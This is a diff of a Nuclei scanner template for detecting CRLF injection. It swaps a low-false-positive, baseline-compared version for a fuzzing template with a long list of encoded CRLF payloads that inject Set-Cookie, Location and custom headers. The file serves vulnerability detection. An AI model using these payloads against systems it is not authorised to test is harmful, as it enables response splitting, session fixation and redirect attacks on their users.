@@ -1,193 +1,76 @@
-id: crlf-injection-low-fp
+id: crlf-injection
 
 info:
-  name: CRLF Injection Detection (Low False Positive)
-  author: coffin,codex
-  severity: high
-  description: |
-    Detects practical CRLF injection by comparing a benign baseline request with
-    an injected request and only reporting when the injected response adds a new
-    Set-Cookie, Location, or custom response header containing a per-scan marker.
-  reference:
-    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
-    - https://docs.projectdiscovery.io/templates/reference/variables
-    - https://docs.projectdiscovery.io/templates/reference/helper-functions
+  name: CRLF Injection
+  author: pdteam
+  severity: low
   metadata:
-    max-request: 12
-    verified: true
-  tags: crlf,header-injection,response-splitting
-
-variables:
-  marker: "{{to_lower(rand_base(8))}}"
-  cookie_name: "crlf{{marker}}"
-  cookie_value: "{{marker}}"
-  redirect_host: "{{marker}}.example"
-  header_name: "x-crlf-{{marker}}"
-  header_value: "{{marker}}"
+    max-request: 41
+  tags: crlf,dast,vuln
 
 http:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
 
-      - |
-        GET /%0D%0ASet-Cookie:%20{{cookie_name}}={{cookie_value}};%20Path=/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
+    payloads:
+      escape:
+        low:
+          - "%00"
+          - "%0a"
+          - "%0a%20"
+          - "%0d"
+          - "%0d%09"
+          - "%0d%0a"
+          - "%0d%0a%09"
+          - "%0d%0a%20"
+          - "%0d%20"
+          - "%20"
+        medium:
+          - "%20%0a"
+          - "%20%0d"
+          - "%20%0d%0a"
+          - "%23%0a"
+          - "%23%0a%20"
+          - "%23%0d"
+          - "%23%0d%0a"
+          - "%23%oa"
+          - "%25%30"
+          - "%25%30%61"
+          - "%2e%2e%2f%0d%0a"
+          - "%2f%2e%2e%0d%0a"
+          - "%2f..%0d%0a"
+          - "%3f"
+        high:
+          - "%3f%0a"
+          - "%3f%0d"
+          - "%3f%0d%0a"
+          - "%e5%98%8a%e5%98%8d"
+          - "%e5%98%8a%e5%98%8d%0a"
+          - "%e5%98%8a%e5%98%8d%0d"
+          - "%e5%98%8a%e5%98%8d%0d%0a"
+          - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
+          - "%u0000"
+          - "%u000a"
+          - "%u000d"
+          - "\r"
+          - "\r%20"
+          - "\r\n"
+          - "\r\n%20"
+          - "\r\n\t"
+          - "\r\t"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"
+
     stop-at-first-match: true
     matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "cookie_name"
-          - "cookie_value"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%0ASet-Cookie:%20{{cookie_name}}={{cookie_value}};%20Path=/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nset-cookie: ', to_lower(cookie_name), '=', to_lower(cookie_value)))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "cookie_name"
-          - "cookie_value"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%0D%0ALocation:%20https://{{redirect_host}}/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "redirect_host"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%0ALocation:%20https://{{redirect_host}}/ HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\nlocation: https://', to_lower(redirect_host), '/'))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "redirect_host"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%0D%0A{{header_name}}:%20{{header_value}} HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "header_name"
-          - "header_value"
-
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-
-      - |
-        GET /%0A{{header_name}}:%20{{header_value}} HTTP/1.1
-        Host: {{Hostname}}
-        Connection: close
-    req-condition: true
-    redirects: false
-    cookie-reuse: false
-    stop-at-first-match: true
-    matchers:
-      - type: dsl
-        condition: and
-        dsl:
-          - "status_code_2 >= 200"
-          - "status_code_2 < 400"
-          - "!contains(concat('\\n', to_lower(all_headers_1)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
-          - "contains(concat('\\n', to_lower(all_headers_2)), concat('\\n', to_lower(header_name), ': ', to_lower(header_value)))"
-    extractors:
-      - type: dsl
-        dsl:
-          - "header_name"
-          - "header_value"
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+# digest: 4a0a00473045022015c1830b995bcda913cc28864b15263881395c09ffeeb5dd5dad17d8f41378fd022100f157c7577fbeb68be85c3343f2c4ee02312f6e8fd577e55699f645a6a9fbd955:922c64590222798bb761d5b6d8e72950
